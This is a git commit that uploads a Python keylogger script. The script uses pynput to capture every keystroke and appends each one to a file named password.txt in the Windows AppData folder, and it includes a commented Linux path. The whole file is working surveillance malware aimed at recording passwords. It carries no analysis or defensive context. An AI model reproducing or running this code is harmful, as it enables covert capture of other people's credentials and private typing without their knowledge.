cc194d0460e41c5598ce9786340068c8fa4fa97f
Abhishek kumar shah <119105510+avsek0-0@users.noreply.github.com>
2024-04-20 12:56:11 +0530

    Add files via upload

---
+++ Keylogger/keylogger.py
@@ -0,0 +1,39 @@
+import os
+from pynput.keyboard import Listener
+
+keys =[]
+count = 0
+path = os.environ['appdata'] + '\\password.txt'
+# path = 'password.txt'                        # For LINUX
+
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count +=1
+    if count >= 1:
+        count = 0
+        write_file(keys)
+        keys = []
+
+def write_file(keys):
+    with open (path,'a') as f:
+        for key in keys:
+            k = str(key).replace("'","")
+            if (k.find('backspace') > 0 ):
+                f.write (' Backspace ')
+            elif k.find('enter') > 0:
+                f.write('\n')
+            elif k.find('shift') > 0:
+                f.write(' Shift ')
+            elif k.find('space') > 0:
+                f.write(' ')
+            elif k.find('caps_lock') > 0:
+                f.write(' Caps_Lock ')
+            elif k.find('tab') > 0:
+                f.write(' Tab ')
+            elif k.find('key'):
+                f.write(k)
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
